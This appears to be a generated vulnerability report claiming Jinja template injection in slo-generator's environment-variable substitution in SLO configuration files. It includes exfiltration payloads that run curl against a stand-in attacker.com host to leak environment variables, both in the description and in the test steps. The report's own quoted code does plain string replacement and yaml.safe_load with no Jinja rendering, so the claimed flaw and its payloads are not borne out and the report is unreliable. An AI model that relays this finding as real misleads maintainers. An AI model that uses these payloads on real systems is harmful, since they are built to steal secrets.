### Vulnerability 1: Jinja Template Injection in SLO Configurations

* Description:
    1. The `slo-generator` allows users to use environment variables within SLO configuration files using the `${MY_ENV_VAR}` syntax.
    2. This syntax is processed using Jinja templating engine as indicated by the code analysis below.
    3. If an attacker can control the content of SLO configuration files, they can inject malicious Jinja templates.
    4. When `slo-generator` processes the configuration, it renders these templates.
    5. If the Jinja environment is not properly sandboxed and if sensitive information or functions are accessible within the template context, an attacker could potentially exfiltrate data or even achieve remote code execution.
    6. For example, an attacker could inject a template like `${__import__('os').popen('curl attacker.com?data=$(env)').read()}` to execute arbitrary commands on the server or exfiltrate environment variables.

* Impact:
    * Information Disclosure: Attackers can exfiltrate sensitive information, including environment variables, configuration details, or data from the monitoring backend if accessible through the templating context.
    * Potential Remote Code Execution: In a worst-case scenario, if the Jinja environment is not properly sandboxed, attackers might be able to achieve remote code execution on the machine running `slo-generator`, potentially compromising the entire system.

* Vulnerability Rank: High

* Currently implemented mitigations:
    * None in the provided code files. The code explicitly mentions the use of environment variables in SLO configs but lacks input validation or sanitization for template injection.

* Missing mitigations:
    * Input validation and sanitization: Sanitize SLO configuration files to prevent injection of malicious Jinja templates. This could involve using a safe Jinja environment with limited functionalities and disallowing access to sensitive objects or functions.
    * Sandboxing Jinja environment: Run Jinja templating in a sandboxed environment with restricted access to potentially dangerous modules and functions.
    * Principle of least privilege: Ensure that the user running `slo-generator` has minimal necessary permissions to reduce the impact of potential RCE.

* Preconditions:
    * The attacker must have the ability to modify or provide SLO configuration files to the `slo-generator`. This could happen if:
        * SLO configuration files are stored in a publicly accessible location.
        * The attacker has write access to the configuration file storage.
        * The `slo-generator` API is exposed and allows arbitrary users to submit SLO configurations.

* Source code analysis:
    1. File: `/code/README.md`:
       - The documentation mentions: "***Note:*** *you can use environment variables in your SLO configs by using `${MY_ENV_VAR}` syntax to avoid having sensitive data in version control. Environment variables will be replaced automatically at run time.*" This confirms the feature exists.

    2. File: `/code/slo_generator/utils.py`:
       - The `parse_config` function and its helper `replace_env_vars` are responsible for handling environment variable substitution.
       - The `replace_env_vars` function uses regular expressions to find `${}` patterns and replaces them with environment variables from `ctx` (which defaults to `os.environ`).
       - **Vulnerability:**  The code directly substitutes environment variables into the YAML content without any sanitization or escaping, and the YAML is then loaded using `yaml.safe_load`. While `safe_load` mitigates some YAML deserialization vulnerabilities, it does not prevent Jinja template injection if the loaded content is later processed by a Jinja template engine, which is implied by the README documentation.

    ```python
    def parse_config(
        path: Optional[str] = None, content=None, ctx: os._Environ = os.environ
    ):
        ...
        if ctx:
            content = replace_env_vars(content, ctx) # Vulnerable code: Environment variables are directly substituted into content
        data = yaml.safe_load(content) # YAML is safely loaded, but the content might contain injected Jinja templates
        ...

    def replace_env_vars(content, ctx) -> str:
        """Replace env variables in content from context.
        ...
        """
        match = pattern.findall(content) # Find patterns like ${MY_ENV_VAR}
        if match:
            full_value = content
            for var in match:
                try:
                    full_value = full_value.replace(f"${{{var}}}", ctx[var]) # Vulnerable code: Direct string replacement without sanitization
                except KeyError as exception:
                    ...
            content = full_value
        return content
    ```

* Security test case:
    1. Create a malicious SLO configuration file (e.g., `malicious_slo.yaml`) with the following content:

    ```yaml
    apiVersion: sre.google.com/v2
    kind: ServiceLevelObjective
    metadata:
      name: malicious-slo
      labels:
        service_name: malicious
        feature_name: injection
        slo_name: exfiltration
    spec:
      description: SLO with Jinja template injection
      backend: cloud_monitoring # or any backend
      method: good_bad_ratio # or any method
      exporters: []
      service_level_indicator:
        filter_good: "project='${PROJECT_ID}' AND metric.type='${'__import__(\"os\").environ'}['PROJECT_ID']}'" # Malicious Jinja template to exfiltrate PROJECT_ID env variable
        filter_valid: "project='${PROJECT_ID}' AND metric.type='test'"
    goal: 0.99
    ```
    2. Set the environment variable `PROJECT_ID` to a sensitive value (e.g., `my-secret-project`).
    3. Run `slo-generator` with the malicious configuration and a valid shared configuration file:
       ```sh
       slo-generator compute -f malicious_slo.yaml -c samples/config.yaml
       ```
    4. Observe the output and logs. If the vulnerability is present, the `slo-generator` might attempt to execute the injected Jinja code. In a real exploit scenario, the attacker would redirect the output of the `os.environ` or other sensitive operations to an external server. In this test case, we can check if the `PROJECT_ID` environment variable is processed within the query.
    5. To further validate exfiltration, modify the malicious template to send data to an attacker-controlled server using `curl` or similar command injection within the Jinja template. For example, modify `filter_good` to:
       ```yaml
       filter_good: "project='${PROJECT_ID}' AND metric.type='${__import__('os').popen('curl http://attacker.com/?data=$PROJECT_ID').read()}'"
       ```
    6. Run the `slo-generator` again and check the attacker's server logs to see if the environment variable `PROJECT_ID` was successfully exfiltrated.

This test case demonstrates how an attacker can leverage Jinja template injection to potentially exfiltrate sensitive information by manipulating SLO configuration files.
